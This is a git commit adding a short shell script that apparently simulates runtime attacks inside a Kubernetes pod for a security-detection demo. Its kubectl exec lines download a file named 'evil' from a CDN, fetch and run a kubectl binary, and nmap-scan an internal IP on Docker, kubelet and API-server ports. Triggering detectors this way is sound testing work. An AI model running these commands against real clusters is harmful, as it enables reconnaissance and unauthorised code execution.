5410de25e3b07e154dd92399f3442ae68a984374
pasqua1e <31853954+pasqua1e@users.noreply.github.com>
2021-05-07 12:11:59 +0100

    Create runtime_attacks.sh

---
+++ files/runtime_attacks.sh
@@ -0,0 +1,15 @@
+PO=$(kubectl get po -n evil|grep evil| awk '{ print $1 }')
+
+echo "DL bad evil file"
+kubectl exec $PO -n evil -- bash -c "curl https://cdn.twistlock.com/john/evil -o evil"
+
+echo "Kubernetes attack"
+kubectl exec $PO -n evil -- bash -c "curl https://storage.googleapis.com/kubernetes-release/release/v1.18.0/bin/linux/amd64/kubectl -o kubectl; chmod +x ./kubectl ; ./kubectl version --client"
+
+echo "bad domain"
+kubectl exec $PO -n evil -- bash -c "curl github.com"
+
+echo "bad port scanning"
+kubectl exec $PO -n evil -- bash -c "nmap -p 80,8080,8081,8082,8083,8084,2375,10250,6443,9998 10.32.0.24"
+
+command || true
